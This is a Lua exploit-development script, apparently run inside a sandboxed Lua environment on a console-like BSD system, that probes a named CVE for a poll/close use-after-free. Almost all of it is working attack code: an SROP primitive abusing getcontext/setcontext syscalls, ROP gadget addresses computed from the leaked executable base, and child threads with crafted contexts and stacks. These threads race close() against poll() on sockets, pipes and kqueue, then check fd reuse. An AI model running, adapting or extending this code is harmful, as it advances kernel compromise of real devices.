-- CRASH_CLASS: MODERATE
-- PROBE 186a: CVE-2026-45251 fd poll/close UAF test
--
-- Now that child syscalls work (185h confirmed), test the core pattern:
-- Thread A: poll(socket_fd, POLLIN, 10000ms) — blocks
-- Thread B (main): close(socket_fd) — should wake Thread A
--
-- If seldrain is missing for the fd type, the close frees the socket
-- object while Thread A's poll still has a selinfo pointer into it → UAF.
--
-- We test: socket, kqueue, and pipe fds.

print("=== 186a: FD POLL/CLOSE UAF ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sc_addr)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local _, gpu = pcall(function()
    return make_syscall(477)(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Eboot + gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108)
local eb_hi = rd(info + 0x10C)
local mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + 0x92C67))
local jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + 0x15481))
local pop_rdi_ret = uint64(string.format("0x%X%08X", eb_hi, eb_lo + 0xC9DFE))

print("gadgets: mov=" .. hex64(mov_g) .. " jmp=" .. hex64(jmp_g) .. " poprdi=" .. hex64(pop_rdi_ret))

-- Helper: create a child that calls poll(pollfd, 1, timeout_ms)
-- After poll returns, writes result to marker via pop_rdi_ret chain
local child_count = 0
local function make_poll_child(pollfd_off, marker_off, timeout_ms)
    child_count = child_count + 1
    local stack_off = 0x40000 + child_count * 0x1000
    -- Stack: [RSP+0]=pop_rdi_ret, [RSP+8]=marker_addr, [RSP+16]=mov_g, [RSP+24]=jmp_g
    wq(gpu + stack_off - 32, pop_rdi_ret)
    wq(gpu + stack_off - 24, ga(marker_off))
    wq(gpu + stack_off - 16, mov_g)
    wq(gpu + stack_off - 8, jmp_g)

    local tc_off = 0x50000 + child_count * 0x500
    for i = 0, 0x4FF, 8 do wq(gpu + tc_off + i, uint64(0)) end
    wq(gpu + tc_off + 0x108, uint64(0x480))
    wd(gpu + tc_off + 0x0D0, 0)
    wq(gpu + tc_off + 0x110, uint64(0x10000))
    wd(gpu + tc_off + 0x0C0, 0x43)
    wd(gpu + tc_off + 0x100, 0x3B)
    wq(gpu + tc_off + 0x0E0, sc_addr)
    wq(gpu + tc_off + 0x0F8, ga(stack_off - 32))
    wq(gpu + tc_off + 0x048, ga(pollfd_off))       -- RDI = pollfd
    wq(gpu + tc_off + 0x050, uint64(1))             -- RSI = nfds
    wq(gpu + tc_off + 0x058, uint64(timeout_ms))    -- RDX = timeout
    wq(gpu + tc_off + 0x078, uint64(209))            -- RAX = poll

    local tb2 = memory.alloc(8)
    wd(tb2, 0)
    local rv = srop(430, ga(tc_off), uint64(tb2))
    local cr = rv and to_num(rv) or -999
    local ct = rd(tb2)
    return cr, ct
end

-- Nanosleep helper
local TS = 0x3F000
local function nsleep(ms)
    wq(gpu + TS, uint64(0))
    wq(gpu + TS + 8, uint64(ms * 1000000))
    srop(240, ga(TS), uint64(0))
end

-- === STEP 1: Socket poll baseline ===
print("")
print("--- S1: SOCKET POLL BASELINE ---")

local rv = srop(97, uint64(2), uint64(2), uint64(17))  -- UDP socket
local sock = rv and to_num(rv) or -1
print("sock=" .. sock)

if sock < 0 then print("NO SOCKET") return end

-- Poll with 0 timeout (non-blocking test)
local PFD = 0x10000
wd(gpu + PFD, sock)
wd(gpu + PFD + 4, 0x0041)  -- POLLIN | POLLPRI
rv = srop(209, ga(PFD), uint64(1), uint64(0))
local pr = rv and to_num(rv) or -999
local rev = rd(gpu + PFD + 4)
print("poll(sock,0ms)=" .. pr .. " rev=0x" .. string.format("%X", rev % 0x10000))

-- === STEP 2: Child polls socket, main closes it ===
print("")
print("--- S2: POLL/CLOSE RACE ---")

-- Create TCP socket for cleaner test
rv = srop(97, uint64(2), uint64(1), uint64(0))
local tsock = rv and to_num(rv) or -1
print("tcp_sock=" .. tsock)
if tsock < 0 then
    tsock = sock
    print("using UDP sock")
end

-- Prepare child's pollfd
local CPFD = 0x11000
wd(gpu + CPFD, tsock)
wd(gpu + CPFD + 4, 0x0001)  -- POLLIN

-- Prepare marker
local CMARK = 0x12000
wq(gpu + CMARK, uint64(0xDEAD))

-- Create child that polls with 10s timeout
local cr, ct = make_poll_child(CPFD, CMARK, 10000)
print("child: rv=" .. cr .. " tid=0x" .. string.format("%X", ct))

if cr ~= 0 then print("CHILD FAILED") return end

-- Wait 200ms for child to enter poll
nsleep(200)

-- Check child alive
rv = srop(431, uint64(ct), uint64(0))
print("child_alive=" .. (rv and to_num(rv) or -999))

-- CLOSE THE SOCKET while child is in poll
print("CLOSING fd=" .. tsock)
rv = srop(6, uint64(tsock))
print("close=" .. (rv and to_num(rv) or -999))

-- Wait 200ms
nsleep(200)

-- Check child status
rv = srop(431, uint64(ct), uint64(0))
local alive = rv and to_num(rv) or -999
print("child_alive_after_close=" .. alive)

-- Read marker — if poll returned, it wrote the result
local cm = rq(gpu + CMARK)
print("marker=" .. hex64(cm) .. " (" .. to_num(cm) .. ")")

-- Read revents
local crev = rd(gpu + CPFD + 4)
print("revents=0x" .. string.format("%X", crev % 0x10000))

if alive ~= 0 then
    print("!!! CHILD DIED AFTER CLOSE — POSSIBLE UAF CRASH !!!")
end

-- === STEP 3: Fd reuse race ===
print("")
print("--- S3: FD REUSE ---")

-- Open new socket — should reuse the fd number
rv = srop(97, uint64(2), uint64(2), uint64(17))
local new_fd = rv and to_num(rv) or -1
print("new_fd=" .. new_fd .. " (old=" .. tsock .. ")")
if new_fd == tsock then
    print("!!! FD NUMBER REUSED — poll child references different object !!!")
end

-- === STEP 4: Repeat with pipe ===
print("")
print("--- S4: PIPE POLL/CLOSE ---")

-- Create pipe via SROP — pipe(42) returns two fds
-- pipe syscall: arg1 = pointer to int[2]
local PIPE_BUF = 0x14000
wd(gpu + PIPE_BUF, 0)
wd(gpu + PIPE_BUF + 4, 0)
rv = srop(42, ga(PIPE_BUF))
local pipe_rv = rv and to_num(rv) or -999
local pipe_rd_fd = rd(gpu + PIPE_BUF)
local pipe_wr_fd = rd(gpu + PIPE_BUF + 4)
print("pipe=" .. pipe_rv .. " rd=" .. pipe_rd_fd .. " wr=" .. pipe_wr_fd)

if pipe_rv == 0 and pipe_rd_fd > 0 then
    -- Child polls read end of pipe
    local PPFD = 0x15000
    wd(gpu + PPFD, pipe_rd_fd)
    wd(gpu + PPFD + 4, 0x0001)  -- POLLIN

    local PMARK = 0x16000
    wq(gpu + PMARK, uint64(0xDEAD))

    local pcr, pct = make_poll_child(PPFD, PMARK, 10000)
    print("pipe_child: rv=" .. pcr .. " tid=0x" .. string.format("%X", pct))

    if pcr == 0 then
        nsleep(200)

        -- Close BOTH ends while child polls
        print("closing pipe fds")
        srop(6, uint64(pipe_wr_fd))
        srop(6, uint64(pipe_rd_fd))

        nsleep(200)

        rv = srop(431, uint64(pct), uint64(0))
        local palive = rv and to_num(rv) or -999
        local pm = rq(gpu + PMARK)
        print("pipe_child_alive=" .. palive)
        print("pipe_marker=" .. hex64(pm))

        if palive ~= 0 then
            print("!!! PIPE CHILD DIED — POSSIBLE UAF !!!")
        end
    end
end

-- === STEP 5: kqueue poll/close ===
print("")
print("--- S5: KQUEUE CLOSE ---")

rv = srop(362)
local kq = rv and to_num(rv) or -1
print("kqueue=" .. kq)

if kq >= 0 then
    -- Create a socket, register in kqueue
    rv = srop(97, uint64(2), uint64(2), uint64(17))
    local ksock = rv and to_num(rv) or -1
    print("ksock=" .. ksock)

    if ksock >= 0 then
        -- Add EVFILT_READ for socket to kqueue
        local KEV = 0x17000
        wq(gpu + KEV, uint64(ksock))        -- ident = socket fd
        wd(gpu + KEV + 8, 0x0001FFFF)       -- filter=EVFILT_READ(-1=0xFFFF), flags=EV_ADD(1)
        wd(gpu + KEV + 12, 0)               -- fflags
        wq(gpu + KEV + 16, uint64(0))       -- data
        wq(gpu + KEV + 24, uint64(0))       -- udata

        rv = srop(363, uint64(kq), ga(KEV), uint64(1), uint64(0), uint64(0))
        print("kevent_add=" .. (rv and to_num(rv) or -999))

        -- Close socket while kqueue has it registered
        srop(6, uint64(ksock))
        print("closed ksock")

        -- Try kevent with timeout to check for dangling reference
        local KOUT = 0x18000
        for i = 0, 31, 4 do wd(gpu + KOUT + i, 0) end
        local KTS = 0x19000
        wq(gpu + KTS, uint64(0))
        wq(gpu + KTS + 8, uint64(10000000))  -- 10ms

        rv = srop(363, uint64(kq), uint64(0), uint64(0), ga(KOUT), uint64(1), ga(KTS))
        print("kevent_wait=" .. (rv and to_num(rv) or -999))

        -- Open new socket to reuse fd number
        rv = srop(97, uint64(2), uint64(2), uint64(17))
        local new_ksock = rv and to_num(rv) or -1
        print("new_sock=" .. new_ksock .. " (old=" .. ksock .. ")")

        if new_ksock == ksock then
            print("!!! KQUEUE FD REUSED — knote may reference wrong object !!!")
            -- kevent again to see what happens
            for i = 0, 31, 4 do wd(gpu + KOUT + i, 0) end
            rv = srop(363, uint64(kq), uint64(0), uint64(0), ga(KOUT), uint64(1), ga(KTS))
            print("kevent_wait2=" .. (rv and to_num(rv) or -999))
        end

        if new_ksock >= 0 then srop(6, uint64(new_ksock)) end
    end
    srop(6, uint64(kq))
end

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
